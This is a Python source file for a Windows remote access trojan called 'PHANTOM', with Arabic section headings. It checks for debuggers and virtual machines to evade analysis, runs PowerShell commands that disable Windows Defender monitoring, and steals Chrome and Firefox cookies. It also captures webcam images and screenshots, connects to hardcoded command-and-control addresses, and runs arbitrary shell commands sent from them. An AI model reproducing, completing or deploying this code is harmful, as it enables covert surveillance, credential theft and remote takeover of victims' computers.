# ============================================
# PHANTOM - Advanced Modular RAT (FIXED)
# ============================================

import socket
import subprocess
import os
import sys
import time
import threading
import shutil
import sqlite3
import winreg
import json
import base64
import random
import string
import hashlib
import zipfile
import ctypes
import struct
from datetime import datetime
import psutil
import win32gui
import win32process
import win32api
import win32con
import win32security
import wmi
import requests
import cv2
import numpy as np
from PIL import ImageGrab
import wave
import pyaudio
import browser_cookie3
import win32crypt
import pickle
import logging

logging.disable(logging.CRITICAL)

# ============================================
# التكوين
# ============================================
class Config:
    C2_SERVERS = [
        ("192.168.1.100", 4444),
        ("10.0.0.50", 8080),
    ]
    MASTER_KEY = hashlib.sha256(b"phantom_master_seed").digest()
    SLEEP_INTERVALS = [5, 10, 30, 60, 300, 600, 3600]
    STEALTH_MODE = True
    PERSISTENCE_DEEP = True
    ENCRYPT_TRAFFIC = True
    ANTI_DEBUG = True
    ANTI_VM = True
    PROCESS_HOLLOWING = True

# ============================================
# مكافحة الاكتشاف
# ============================================
class AntiDetection:
    @staticmethod
    def anti_debug():
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
        except:
            pass
    
    @staticmethod
    def anti_vm():
        try:
            vm_indicators = ["vbox", "vmware", "qemu"]
            for proc in psutil.process_iter(['name']):
                try:
                    if any(vm in proc.info['name'].lower() for vm in vm_indicators):
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def disable_defender():
        try:
            commands = [
                "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
                "powershell Set-MpPreference -DisableBehaviorMonitoring $true",
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except:
            pass

# ============================================
# التجسس
# ============================================
class SpyModule:
    @staticmethod
    def capture_webcam():
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
            cap.release()
        except:
            return None
    
    @staticmethod
    def steal_cookies():
        cookies = {}
        try:
            for browser in ['chrome', 'firefox']:
                try:
                    cj = getattr(browser_cookie3, browser)(domain_name=None)
                    cookies[browser] = []
                    for cookie in cj:
                        cookies[browser].append({
                            "domain": cookie.domain,
                            "name": cookie.name,
                            "value": cookie.value
                        })
                except:
                    pass
        except:
            pass
        return json.dumps(cookies)

# ============================================
# الاتصال
# ============================================
class C2Communication:
    def __init__(self):
        self.current_server = 0
        self.sleep_index = 0
    
    def connect(self):
        while True:
            server = Config.C2_SERVERS[self.current_server]
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect(server)
                return sock
            except:
                self.current_server = (self.current_server + 1) % len(Config.C2_SERVERS)
                time.sleep(Config.SLEEP_INTERVALS[self.sleep_index])
                self.sleep_index = min(self.sleep_index + 1, len(Config.SLEEP_INTERVALS) - 1)

# ============================================
# الرئيسي
# ============================================
class PhantomRAT:
    def __init__(self):
        self.anti_detection = AntiDetection()
        self.spy = SpyModule()
        self.communication = C2Communication()
    
    def execute_command(self, command):
        try:
            if command == "whoami":
                return subprocess.getoutput("whoami")
            elif command.startswith("cmd:"):
                return subprocess.getoutput(command[4:])
            elif command == "screenshot":
                img = ImageGrab.grab()
                img_path = "screen.png"
                img.save(img_path)
                with open(img_path, "rb") as f:
                    return base64.b64encode(f.read()).decode()
            elif command == "webcam":
                return self.spy.capture_webcam()
            elif command == "cookies":
                return self.spy.steal_cookies()
            elif command == "exit":
                sys.exit(0)
            else:
                return subprocess.getoutput(command)
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def cleanup(self):
        try:
            for f in ["screen.png", "audio.wav"]:
                if os.path.exists(f):
                    os.remove(f)
        except:
            pass
    
    def run(self):
        if Config.ANTI_DEBUG:
            self.anti_detection.anti_debug()
        
        if Config.ANTI_VM and self.anti_detection.anti_vm():
            sys.exit(0)
        
        self.anti_detection.disable_defender()
        
        while True:
            try:
                sock = self.communication.connect()
                sock.send(b"PHANTOM_ACTIVE")
                while True:
                    try:
                        data = sock.recv(4096).decode()
                        if not data:
                            break
                        result = self.execute_command(data)
                        sock.send(result.encode() if result else b"OK")
                    except:
                        break
            except:
                time.sleep(60)
                continue

# ============================================
# نقطة الدخول
# ============================================
if __name__ == "__main__":
    rat = PhantomRAT()
    rat.run()
